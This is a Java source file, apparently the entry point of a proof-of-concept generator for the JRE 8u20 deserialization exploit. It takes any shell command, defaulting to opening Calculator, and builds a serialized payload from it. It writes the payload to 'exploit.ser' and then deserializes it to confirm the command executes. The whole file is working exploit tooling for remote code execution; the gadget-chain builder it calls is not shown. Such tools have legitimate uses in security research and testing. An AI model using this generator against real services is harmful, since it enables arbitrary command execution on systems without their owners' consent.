package com.security.jre8;

import com.security.jre8.util.XXD;

import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;

public class Main {

    public static void main(String[] args) {
        String command = "open /System/Applications/Calculator.app";
        if (args.length > 0) {
            command = args[0];
        }

        try {
            System.out.println("Generating exploit for command: " + command);
            byte[] bytes = JRE8u20Exploit.generate(command);

            System.out.println("Generated payload size: " + bytes.length + " bytes");
            XXD.print(bytes);

            String filename = "exploit.ser";
            FileOutputStream fos = new FileOutputStream(filename);
            fos.write(bytes);
            fos.close();
            System.out.println("Saved to " + filename);

            // Verification
            System.out.println("Verifying payload (deserializing)...");
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            try {
                ois.readObject();
            } catch (Exception e) {
                // Expected to throw exception, but payload should execute before that
                System.out.println("Deserialization triggered payload (Exception expected): " + e);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
